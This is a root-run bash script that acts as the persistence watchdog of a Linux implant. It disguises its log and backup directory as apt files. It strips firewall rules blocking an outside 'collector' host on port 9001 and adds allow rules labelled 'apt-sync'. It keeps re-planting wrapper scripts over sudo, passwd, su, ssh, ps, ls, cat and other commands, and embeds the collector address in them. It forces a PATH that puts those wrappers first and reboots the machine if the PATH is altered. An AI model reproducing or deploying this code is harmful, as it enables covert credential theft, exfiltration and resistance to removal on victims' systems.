#!/bin/bash
_H="${1:-}"
_P="9001"
_BD="${2:-/usr/lib/x86_64-linux-gnu/apt/methods/.d}"
DEST="/usr/local/bin"
_IV=60
_L="/var/lib/apt/lists/.cache/sync.log"

_IPT="/usr/sbin/iptables"
_IP6T="/usr/sbin/ip6tables"
_CP="/bin/cp"
_SED="/bin/sed"
_CHMOD="/bin/chmod"
_MKDIR="/bin/mkdir"
_GREP="/bin/grep"
_PRINTF="/usr/bin/printf"
_BASE64="/usr/bin/base64"
_CURL="/usr/bin/curl"
_NC="/usr/bin/nc"
_UFW="/usr/sbin/ufw"
_SYSTEMCTL="/usr/bin/systemctl"
_BASENAME="/usr/bin/basename"
_READLINK="/usr/bin/readlink"
_SORT="/usr/bin/sort"
_AWK="/usr/bin/awk"
_DATE="/usr/bin/date"

if [ -z "$_H" ]; then
    echo "Usage: sudo ./bonsly.sh <collector_ip> [backup_dir]"
    exit 1
fi
if [ "$EUID" -ne 0 ]; then
    echo "Run as root"
    exit 1
fi
$_MKDIR -p "$(dirname "$_L")" 2>/dev/null
$_CHMOD 777 "$(dirname "$_L")" 2>/dev/null
touch "$_L" 2>/dev/null
$_CHMOD 777 "$_L" 2>/dev/null

_l() {
    echo "$($_DATE -u "+%Y-%m-%dT%H:%M:%SZ") $1" >> "$_L" 2>/dev/null
}

_reboot() {
    _l "INFO rebooting"
    sleep 2
    if [ -x /usr/sbin/reboot ]; then /usr/sbin/reboot
    elif [ -x /sbin/reboot ]; then /sbin/reboot
    else $_SYSTEMCTL reboot 2>/dev/null
    fi
}

WRAPPERS=(
    "sudo_wrapper.sh:sudo"
    "passwd_wrapper.sh:passwd"
    "su_wrapper.sh:su"
    "ssh_wrapper.sh:ssh"
    "useradd_wrapper.sh:useradd"
    "adduser_wrapper.sh:adduser"
    "userdel_wrapper.sh:userdel"
    "deluser_wrapper.sh:deluser"
    "usermod_wrapper.sh:usermod"
    "visudo_wrapper.sh:visudo"
    "systemctl_wrapper.sh:systemctl"
    "ufw_wrapper.sh:ufw"
    "iptables_wrapper.sh:iptables"
    "iptables_wrapper.sh:ip6tables"
    "rm_wrapper.sh:rm"
    "ls_wrapper.sh:ls"
    "find_wrapper.sh:find"
    "ps_wrapper.sh:ps"
    "kill_wrapper.sh:kill"
    "pkill_wrapper.sh:pkill"
    "killall_wrapper.sh:killall"
    "grep_wrapper.sh:grep"
    "stat_wrapper.sh:stat"
    "chmod_wrapper.sh:chmod"
    "chown_wrapper.sh:chown"
    "mv_wrapper.sh:mv"
    "cp_wrapper.sh:cp"
    "which_wrapper.sh:which"
    "cat_wrapper.sh:cat"
    "less_wrapper.sh:less"
    "more_wrapper.sh:more"
    "file_wrapper.sh:file"
    "strings_wrapper.sh:strings"
    "diff_wrapper.sh:diff"
    "md5sum_wrapper.sh:md5sum"
    "sha256sum_wrapper.sh:sha256sum"
    "iptables-save_wrapper.sh:iptables-save"
    "iptables-save_wrapper.sh:ip6tables-save"
)

_ear() {
    local ipt="$1"
    [ -x "$ipt" ] || return

    local changed=1
    while [ $changed -eq 1 ]; do
        changed=0
        while IFS= read -r rule; do
            [ -z "$rule" ] && continue
            $ipt -D OUTPUT $rule 2>/dev/null && changed=1
        done < <($ipt -L OUTPUT --line-numbers -n 2>/dev/null | \
            $_AWK -v h="$_H" '$0 ~ h && ($0 ~ /DROP/ || $0 ~ /REJECT/) {print $1}' | \
            $_SORT -rn)
    done

    if ! $ipt -C OUTPUT -p tcp -d "$_H" --dport "$_P" -j ACCEPT 2>/dev/null; then
        $ipt -I OUTPUT 1 -p tcp -d "$_H" --dport "$_P" -j ACCEPT 2>/dev/null
        _l "INFO inserted OUTPUT ACCEPT rule for ${_H}:${_P} ($ipt)"
    fi
}

_cf() {
    _ear "$_IPT"
    _ear "$_IP6T"

    if [ -x "$_UFW" ] && $_UFW status 2>/dev/null | $_GREP -q "Status: active"; then
        if ! $_UFW status numbered 2>/dev/null | $_GREP -q "$_H"; then
            $_UFW allow out to "$_H" port "$_P" proto tcp comment "apt-sync" > /dev/null 2>&1
            _l "INFO added ufw allow out rule for ${_H}:${_P}"
        fi
    fi

    if [ -x "$_NC" ]; then
        if ! $_NC -z -w3 "$_H" "$_P" 2>/dev/null; then
            _l "WARN collector ${_H}:${_P} unreachable"
        fi
    fi
}

_cp_path() {
    local EXPECTED='PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"'
    if ! $_GREP -q 'PATH="/usr/local/bin:' /etc/environment 2>/dev/null; then
        _l "WARN PATH tampered — fixing and rebooting"
        $_SED -i '/^PATH=/d' /etc/environment
        echo "$EXPECTED" >> /etc/environment
        return 1
    fi
    return 0
}

_cw() {
    if [ ! -d "$DEST" ]; then
        _l "WARN $DEST directory missing — recreating"
        $_MKDIR -p "$DEST"
        $_CHMOD 755 "$DEST"
        for bin in /usr/bin/* /usr/sbin/*; do
            name=$($_BASENAME "$bin")
            dst="$DEST/$name"
            [ -f "$dst" ] && continue
            [ -x "$bin" ] || continue
            # Skip .sh files — sourced scripts break if wrapped as executables
            [[ "$name" == *.sh ]] && continue
            real=$($_READLINK -f "$bin")
            [[ "$real" == /usr/local/bin/* ]] && continue
            $_PRINTF '#!/bin/bash\nexec "%s" "$@"\n' "$bin" > "$dst"
            $_CHMOD 755 "$dst"
        done
        _l "INFO repopulated stubs in $DEST"
    fi

    if [ ! -d "$_BD" ]; then
        _l "ERROR backup dir $_BD missing — cannot restore wrappers"
        return
    fi

    RESTORED=0
    _HE=$($_PRINTF "%s" "$_H" | $_BASE64 -w0)
    for pair in "${WRAPPERS[@]}"; do
        src="${pair%%:*}"
        dest="${pair##*:}"
        dest_path="$DEST/$dest"
        src_path="$_BD/$src"
        if [ ! -f "$src_path" ]; then
            _l "WARN backup missing for $src — cannot restore $dest"
            continue
        fi
        RESTORE=0
        if [ ! -f "$dest_path" ]; then
            _l "WARN $dest missing — restoring"
            RESTORE=1
        elif ! $_GREP -q "__ENC__\|${_H}" "$dest_path" 2>/dev/null; then
            _l "WARN $dest replaced — restoring"
            RESTORE=1
        fi
        if [ $RESTORE -eq 1 ]; then
            $_CP "$src_path" "$dest_path"
            $_SED -i "s/__ENC__/$_HE/g" "$dest_path"
            $_CHMOD 755 "$dest_path"
            _l "INFO restored $dest"
            RESTORED=$((RESTORED+1))
        fi
    done
    [ $RESTORED -gt 0 ] && _l "INFO restored $RESTORED wrapper(s)"
}

_l "INFO watcher started (collector=${_H}:${_P}, backup=${_BD}, interval=${_IV}s)"
while true; do
    _cf
    _cw
    _cp_path || _reboot
    sleep $_IV
done
